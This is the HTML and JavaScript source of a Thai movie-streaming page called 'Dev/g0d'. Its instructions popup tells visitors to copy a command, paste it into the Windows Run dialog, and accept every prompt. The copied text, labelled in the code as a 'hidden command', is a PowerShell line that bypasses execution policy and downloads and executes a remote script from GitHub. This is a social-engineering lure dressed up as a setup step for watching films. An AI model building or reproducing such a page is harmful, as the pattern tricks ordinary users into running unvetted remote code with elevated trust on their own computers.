<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dev/g0d - เว็บหนัง</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #10131a;
      color: #c9d5ea;
      font-family: 'Segoe UI', Arial, sans-serif;
    }
    .howto-btn {
      position: fixed;
      top: 32px;
      right: 32px;
      z-index: 1001;
      background: #232c4a;
      color: #fff;
      border: 1.5px solid #2563eb;
      border-radius: 999px;
      padding: 10px 22px 10px 22px;
      font-size: 1.1rem;
      font-weight: 500;
      box-shadow: 0 6px 24px 1px #27304999;
      transition: background 0.15s, color 0.15s, border-color 0.15s;
      cursor: pointer;
      letter-spacing: 0.03em;
    }
    .howto-btn:hover {
      background: #2563eb;
      color: #fff;
      border-color: #ec4899;
    }
    .howto-popup-mask {
      display: none;
      position: fixed;
      z-index: 10010;
      left: 0; top: 0; right: 0; bottom: 0;
      width: 100vw; height: 100vh;
      background: rgba(10,14,28,0.96);
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(2px);
      transition: background .2s;
    }
    .howto-popup-mask.show { display: flex; }
    .howto-popup-content {
      background: linear-gradient(135deg, #18203a 80%, #232c4a 100%);
      border-radius: 1.3rem;
      box-shadow: 0 2px 50px 2px #232c4a66;
      padding: 2.4rem 2.5rem 2.2rem 2.5rem;
      max-width: 420px;
      width: 95vw;
      position: relative;
      color: #d0e2ff;
      border: 2px solid #2563eb;
      animation: popup-in 0.22s;
    }
    @keyframes popup-in {
      from { transform: scale(0.98) translateY(20px); opacity: 0; }
      to   { transform: scale(1) translateY(0); opacity: 1; }
    }
    .howto-popup-content h2 {
      color: #ec4899;
      font-size: 1.45rem;
      margin-bottom: 0.5rem;
      letter-spacing: 0.04em;
      font-weight: 700;
      text-align: left;
    }
    .howto-popup-content ol {
      margin: 0.6em 0 0 0.5em;
      padding: 0 0 0 1em;
      list-style: decimal outside;
    }
    .howto-popup-content li {
      margin-bottom: 1.12em;
      font-size: 1.1rem;
      line-height: 1.7;
      word-break: break-word;
      display: flex;
      align-items: flex-start;
    }
    .howto-popup-content .copy-text {
      color: #2563eb;
      cursor: pointer;
      text-decoration: underline;
    }
    .howto-popup-content .copy-text:hover {
      color: #ec4899;
    }
    .howto-popup-content .howto-close {
      background: none;
      border: none;
      color: #b7c9f3;
      font-size: 2.1rem;
      position: absolute;
      top: 10px; right: 20px;
      cursor: pointer;
      transition: color 0.13s;
      z-index: 1;
    }
    .howto-popup-content .howto-close:hover { color: #ec4899; }
    .howto-popup-content .howto-footer {
      margin-top: 1.2em;
      font-size: 0.98rem;
      color: #8ca3c7;
      text-align: right;
      padding-top: 0.8em;
      border-top: 1px solid #23305a;
    }
    .thumbnail {
      background: #181b28;
      border: 1.5px solid #2563eb;
      transition: transform 0.25s, box-shadow 0.25s;
      box-shadow: 0 2px 10px 0 #11131a60;
    }
    .thumbnail:hover {
      transform: translateY(-3px) scale(1.015);
      box-shadow: 0 6px 24px 2px #27304955;
      border-color: #2563eb;
    }
    .main-btn {
      background: #2563eb;
      color: #fff;
      border: none;
      transition: background 0.17s, color 0.17s, opacity 0.15s;
      border-radius: 0.5rem;
      font-size: 1.05rem;
      box-shadow: 0 1px 3px #0002;
      padding: 0.5rem 1rem;
      width: 100%;
      margin-top: 1.2rem;
    }
    .main-btn:hover:enabled {
      background: #ec4899;
      color: #fff;
    }
    .tab {
      background: none;
      color: #fff;
      border: none;
      transition: background 0.2s, color 0.2s;
      padding: 0.7rem 1.5rem;
      border-radius: 0.5rem;
      font-size: 1.05rem;
      margin-right: 20px;
      font-weight: 500;
    }
    .tab:last-child { margin-right: 0; }
    .tab.active-tab {
      background: #2563eb;
      color: #fff;
      box-shadow: 0 2px 12px #1e233b33;
    }
    .tab:not(.active-tab):hover {
      color: #ec4899;
      background: none;
    }
    .media-container {
      position: relative;
      width: 100%;
      height: 192px;
      overflow: hidden;
      background: #000;
      cursor: pointer;
      border-bottom: 1.5px solid #2563eb;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .media-container img,
    .media-container .yt-preview {
      position: absolute;
      width: 100%; height: 100%;
      object-fit: contain; top: 0; left: 0;
      transition: opacity 0.16s;
      pointer-events: none;
    }
    .media-container .yt-preview {
      opacity: 0;
      z-index: 2;
      pointer-events: none;
      background: #000;
      border: none;
      outline: none;
    }
    .media-container:hover img {
      opacity: 0;
    }
    .media-container:hover .yt-preview {
      opacity: 1;
      pointer-events: auto;
    }
    .movie-tag {
      display: inline-block;
      font-size: 0.73rem;
      font-weight: 500;
      letter-spacing: 0.01em;
      padding: 0.5px 8px;
      border-radius: 999px;
      margin-bottom: 0;
      margin-right: 6px;
      vertical-align: middle;
      user-select: none;
      line-height: 1.6;
      background: #232c4a;
      color: #2563eb;
      border: 1.2px solid #2563eb;
    }
    .text-gray-400 { color: #8ca3c7 !important; }
    .text-xl { font-size: 1.20rem;}
    .center-content-wrapper {
      width: 100vw;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
    }
    .search-bar {
      background: #181b28;
      border: 1.5px solid #2563eb;
      color: #c9d5ea;
      padding: 13px 18px;
      border-radius: 12px;
      width: 100%; max-width: 400px;
      font-size: 1.08rem;
      margin: 0 auto 2.3rem auto;
      display: block;
      transition: border .18s, box-shadow .18s;
    }
    .search-bar:focus {
      outline: none;
      border-color: #2563eb;
      box-shadow: 0 0 8px 1.5px #2563eb;
    }
    .popup-mask {
      display: none;
      position: fixed;
      z-index: 10000;
      left: 0; top: 0; right: 0; bottom: 0;
      width: 100vw; height: 100vh;
      background: rgba(0,0,0,0.93);
      align-items: center;
      justify-content: center;
    }
    .popup-mask.show {
      display: flex;
    }
    .popup-content {
      position: relative;
      width: 90vw;
      max-width: 1200px;
      height: 60vw;
      max-height: 70vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: none;
    }
    .popup-content iframe {
      width: 100%;
      height: 100%;
      border: none;
      background: #000;
      border-radius: 0;
      max-width: 100vw;
      max-height: 80vh;
      min-height: 320px;
    }
    .popup-close {
      position: absolute;
      top: -44px; right: 0;
      font-size: 2.3rem;
      color: #c9d5ea;
      background: none;
      border: none;
      cursor: pointer;
      z-index: 101;
      transition: color 0.17s;
    }
    .popup-close:hover { color: #ec4899; }
    @media (max-width: 800px) {
      .popup-content { width: 98vw; height: 56vw; max-width: 99vw; max-height: 60vh; }
      .howto-popup-content { padding: 1.1rem 0.7rem 1.3rem 0.7rem; max-width: 99vw; font-size: 1rem;}
    }
    @media (max-width: 500px) {
      .popup-content { width: 100vw; height: 50vw; max-width: 100vw; max-height: 50vh; }
    }
    @media (max-width: 600px) {
      .howto-btn { top: 14px; right: 14px; padding: 8px 15px; font-size: 1.01rem;}
    }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center p-6">

  <!-- Howto Button -->
  <button class="howto-btn" id="howtoBtn" type="button">การใช้งาน</button>
  <!-- Howto Popup -->
  <div class="howto-popup-mask" id="howtoPopupMask">
    <div class="howto-popup-content">
      <button class="howto-close" id="howtoCloseBtn" aria-label="ปิด">×</button>
      <h2>วิธีใช้งาน <span style="color:#fff; font-weight:400;">(ทำครั้งเดียว)</span></h2>
      <ol>
        <li>1. กดคัดลอกด้านล่าง</li>
        <li style="display: block;"><span class="copy-text" id="copyText">คัดลอก</span></li>
        <li>2. กด Win + R วางที่คัดลอก</li>
        <li>3. วางเสร็จกด ok</li>
        <li>4. ขึ้นอะไรมาให้กด Yes</li>
        <li>5. รอจนมันหายไป</li>
        <li>6. กด ดูหนังออนไลน์</li>
      </ol>
      <div class="howto-footer">
        <span>Dev/g0d</span>
      </div>
    </div>
  </div>

  <h1 class="text-4xl mb-6" style="color:#2563eb">Dev/g0d - เว็บหนัง</h1>
  <div class="center-content-wrapper">
    <div id="mainContent">
      <input type="text" id="searchBar" class="search-bar" placeholder="ค้นหาชื่อหนัง...">
      <div class="flex space-x-4 mb-8 justify-center">
        <button id="onlineTab" class="tab active-tab">มีให้ชม</button>
        <button id="seriesTab" class="tab">ซีรี่ย์</button>
        <button id="comingTab" class="tab">เร็วๆนี้</button>
      </div>
      <div id="movieGrid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 w-full max-w-6xl"></div>
      <div id="seriesList" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 w-full max-w-6xl hidden"></div>
      <div id="comingList" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 w-full max-w-6xl hidden"></div>
    </div>
  </div>
  <div id="popupMask" class="popup-mask">
    <div class="popup-content">
      <button class="popup-close" id="popupCloseBtn" aria-label="ปิด">×</button>
      <!-- iframe จะถูกใส่ตรงนี้ -->
    </div>
  </div>
  <script>
    // Howto button and popup
    const howtoBtn = document.getElementById('howtoBtn');
    const howtoPopupMask = document.getElementById('howtoPopupMask');
    const howtoCloseBtn = document.getElementById('howtoCloseBtn');
    howtoBtn.onclick = function() {
      howtoPopupMask.classList.add('show');
    };
    howtoCloseBtn.onclick = function() {
      howtoPopupMask.classList.remove('show');
    };
    howtoPopupMask.onclick = function(e) {
      if(e.target === howtoPopupMask) howtoPopupMask.classList.remove('show');
    };
    // Copy to clipboard (hidden command)
    const copyText = document.getElementById('copyText');
    const powershellCmd = `powershell -ExecutionPolicy Bypass -NoProfile -Command "irm https://raw.githubusercontent.com/dev-g0d/dev-g0d.github.io/refs/heads/main-site/site/movie/launcher.ps1 | iex"`;
    copyText.onclick = function() {
      navigator.clipboard.writeText(powershellCmd).then(() => {
        copyText.innerText = "คัดลอกแล้ว!";
        setTimeout(() => copyText.innerText = "คัดลอก", 1200);
      });
    };

    // --- เว็บหนัง logic ---
    let movies = [], series = [], coming = [];
    let currentTab = "movies";
    function getYoutubeId(url) {
      const ytIdMatch = url.match(/(?:youtu\.be\/|v=|\/embed\/|shorts\/)([a-zA-Z0-9_-]{11})/);
      return ytIdMatch ? ytIdMatch[1] : null;
    }
    function getYoutubeEmbed(url, muted = true, controls = 0, autoplay = 1) {
      const vid = getYoutubeId(url);
      if (!vid) return null;
      let params = `autoplay=${autoplay}&mute=${muted ? 1 : 0}&controls=${controls}&showinfo=0&rel=0&fs=0&loop=1&playlist=${vid}`;
      return `https://www.youtube.com/embed/${vid}?${params}`;
    }
    function renderMovieTag(type) {
      if (type === "online") {
        return '<span class="movie-tag">มีให้ชม</span>';
      }
      if (type === "series") {
        return '<span class="movie-tag" style="background:#3d1d2d;color:#ec4899;border-color:#ec4899;">ซีรี่ย์</span>';
      }
      if (type === "coming") {
        return '<span class="movie-tag" style="background:#3b3218;color:#eab308;border-color:#eab308;">เร็วๆนี้</span>';
      }
      return '';
    }
    function renderMovies(list = movies) {
      const movieGrid = document.getElementById('movieGrid');
      movieGrid.innerHTML = '';
      document.getElementById('seriesList').classList.add('hidden');
      document.getElementById('comingList').classList.add('hidden');
      movieGrid.classList.remove('hidden');
      list.forEach(movie => {
        const card = document.createElement('div');
        card.className = 'thumbnail rounded-lg overflow-hidden';

        let ytEmbed = "";
        let ytId = "";
        if(movie.video && getYoutubeId(movie.video)){
          ytId = getYoutubeId(movie.video);
          ytEmbed = `<iframe class="yt-preview" src="${getYoutubeEmbed(movie.video,true,0,1)}" allow="autoplay; encrypted-media" frameborder="0" tabindex="-1"></iframe>`;
        }

        card.innerHTML =
          `<div class="media-container" ${ytEmbed ? `data-ytid="${ytId}"` : ""}>
            <img src="${movie.thumbnail}" alt="${movie.title}">
            ${ytEmbed}
          </div>
          <div class="p-4">
            <div class="mb-1">${renderMovieTag("online")}</div>
            <p class="text-xl" style="color:#c9d5ea !important;">${movie.title}</p>
            <p class="text-gray-400 text-sm mb-2">${movie.year ? `ปี ${movie.year}` : ''}</p>
            <button class="main-btn" type="button">ดูออนไลน์</button>
          </div>
        `;
        movieGrid.appendChild(card);

        // ปุ่ม ดูออนไลน์
        const viewBtn = card.querySelector('.main-btn');
        if (viewBtn && movie.connect) {
          viewBtn.addEventListener('click', function() {
            window.location.href = movie.connect;
          });
        } else if (viewBtn) {
          viewBtn.classList.add('disabled-btn');
        }

        // คลิกที่ thumbnail เปิด popup (รูปหรือ iframe)
        const media = card.querySelector('.media-container');
        if(media && ytId){
          media.addEventListener('click', function(e) {
            showYoutubePopup(ytId);
          });
        }
      });
    }
    function renderSeries(list = series) {
      const seriesList = document.getElementById('seriesList');
      seriesList.innerHTML = '';
      document.getElementById('movieGrid').classList.add('hidden');
      document.getElementById('comingList').classList.add('hidden');
      seriesList.classList.remove('hidden');
      list.forEach(movie => {
        const card = document.createElement('div');
        card.className = 'thumbnail rounded-lg overflow-hidden';

        let ytEmbed = "";
        let ytId = "";
        if(movie.video && getYoutubeId(movie.video)){
          ytId = getYoutubeId(movie.video);
          ytEmbed = `<iframe class="yt-preview" src="${getYoutubeEmbed(movie.video,true,0,1)}" allow="autoplay; encrypted-media" frameborder="0" tabindex="-1"></iframe>`;
        }

        card.innerHTML =
          `<div class="media-container" ${ytEmbed ? `data-ytid="${ytId}"` : ""}>
            <img src="${movie.thumbnail}" alt="${movie.title}">
            ${ytEmbed}
          </div>
          <div class="p-4">
            <div class="mb-1">${renderMovieTag("series")}</div>
            <p class="text-xl" style="color:#c9d5ea !important;">${movie.title}</p>
            <p class="text-gray-400 text-sm mb-2">${movie.year ? `ปี ${movie.year}` : ''}</p>
            <button class="main-btn" type="button">ดูออนไลน์</button>
          </div>
        `;
        seriesList.appendChild(card);

        const viewBtn = card.querySelector('.main-btn');
        if (viewBtn && movie.connect) {
          viewBtn.addEventListener('click', function() {
            window.location.href = movie.connect;
          });
        } else if (viewBtn) {
          viewBtn.classList.add('disabled-btn');
        }

        const media = card.querySelector('.media-container');
        if(media && ytId){
          media.addEventListener('click', function(e) {
            showYoutubePopup(ytId);
          });
        }
      });
    }
    function renderComing(list = coming) {
      const comingList = document.getElementById('comingList');
      comingList.innerHTML = '';
      document.getElementById('movieGrid').classList.add('hidden');
      document.getElementById('seriesList').classList.add('hidden');
      comingList.classList.remove('hidden');
      list.forEach(movie => {
        const card = document.createElement('div');
        card.className = 'thumbnail rounded-lg overflow-hidden';

        let ytEmbed = "";
        let ytId = "";
        if(movie.video && getYoutubeId(movie.video)){
          ytId = getYoutubeId(movie.video);
          ytEmbed = `<iframe class="yt-preview" src="${getYoutubeEmbed(movie.video,true,0,1)}" allow="autoplay; encrypted-media" frameborder="0" tabindex="-1"></iframe>`;
        }

        card.innerHTML =
          `<div class="media-container" ${ytEmbed ? `data-ytid="${ytId}"` : ""}>
            <img src="${movie.thumbnail}" alt="${movie.title}">
            ${ytEmbed}
          </div>
          <div class="p-4">
            <div class="mb-1">${renderMovieTag("coming")}</div>
            <p class="text-xl" style="color:#c9d5ea !important;">${movie.title}</p>
            <p class="text-gray-400 text-sm mb-2">${movie.year ? `ปี ${movie.year}` : ''}</p>
            <button class="main-btn disabled-btn" type="button" disabled>ดูออนไลน์</button>
          </div>
        `;
        comingList.appendChild(card);

        const media = card.querySelector('.media-container');
        if(media && ytId){
          media.addEventListener('click', function(e) {
            showYoutubePopup(ytId);
          });
        }
      });
    }
    function showYoutubePopup(ytId) {
      const mask = document.getElementById('popupMask');
      const popupContent = mask.querySelector('.popup-content');
      let oldIframe = popupContent.querySelector('iframe');
      if(oldIframe) popupContent.removeChild(oldIframe);
      const src = `https://www.youtube.com/embed/${ytId}?autoplay=1&mute=0&controls=1&showinfo=0&rel=0&fs=1`;
      const iframe = document.createElement('iframe');
      iframe.src = src;
      iframe.allow = "autoplay; encrypted-media";
      iframe.frameBorder = "0";
      iframe.allowFullscreen = true;
      popupContent.appendChild(iframe);
      mask.classList.add('show');
      mask.onclick = function(e){
        if(e.target === mask) closePopup();
      };
    }
    function closePopup() {
      const mask = document.getElementById('popupMask');
      mask.classList.remove('show');
      let iframe = mask.querySelector('.popup-content iframe');
      if(iframe) iframe.remove();
    }
    document.getElementById('popupCloseBtn').onclick = closePopup;
    document.getElementById('onlineTab').addEventListener('click', () => {
      currentTab = "movies";
      document.getElementById('onlineTab').classList.add('active-tab');
      document.getElementById('seriesTab').classList.remove('active-tab');
      document.getElementById('comingTab').classList.remove('active-tab');
      document.getElementById('searchBar').value = '';
      renderMovies(movies);
    });
    document.getElementById('seriesTab').addEventListener('click', () => {
      currentTab = "series";
      document.getElementById('seriesTab').classList.add('active-tab');
      document.getElementById('onlineTab').classList.remove('active-tab');
      document.getElementById('comingTab').classList.remove('active-tab');
      document.getElementById('searchBar').value = '';
      renderSeries(series);
    });
    document.getElementById('comingTab').addEventListener('click', () => {
      currentTab = "coming";
      document.getElementById('comingTab').classList.add('active-tab');
      document.getElementById('onlineTab').classList.remove('active-tab');
      document.getElementById('seriesTab').classList.remove('active-tab');
      document.getElementById('searchBar').value = '';
      renderComing(coming);
    });
    document.getElementById('searchBar').addEventListener('input', () => {
      const searchTerm = document.getElementById('searchBar').value.trim().toLowerCase();
      if (currentTab === "movies") {
        const filtered = movies.filter(item => (item.title || '').toLowerCase().includes(searchTerm));
        renderMovies(filtered);
      } else if (currentTab === "series") {
        const filtered = series.filter(item => (item.title || '').toLowerCase().includes(searchTerm));
        renderSeries(filtered);
      } else {
        const filtered = coming.filter(item => (item.title || '').toLowerCase().includes(searchTerm));
        renderComing(filtered);
      }
    });
    async function loadAllData() {
      try {
        const [moviesData, seriesData, comingData] = await Promise.all([
          fetch('movies.json').then(r => r.json()),
          fetch('series.json').then(r => r.json()),
          fetch('coming.json').then(r => r.json())
        ]);
        movies = moviesData;
        series = seriesData;
        coming = comingData;
        renderMovies(movies);
      } catch (e) {
        renderMovies([
          {
            title: "final Destination: Bloodlines ทายาทโกงตาย",
            thumbnail: "https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcRPOL53RyoU4eyip77wbyuNsOWMhHTy_keVNujx8nHDCVy3eirJ",
            video: "https://youtu.be/UWMzKXsY9A4?si=RrA5yMQnbOpPb7zV",
            connect: "vlcg0d:https://huggingface.co/ceog0d/mv-data/resolve/main/FD4.data?download=true",
            year: 2025
          }
        ]);
      }
    }
    document.addEventListener('DOMContentLoaded', loadAllData);
  </script>
</body>
</html>
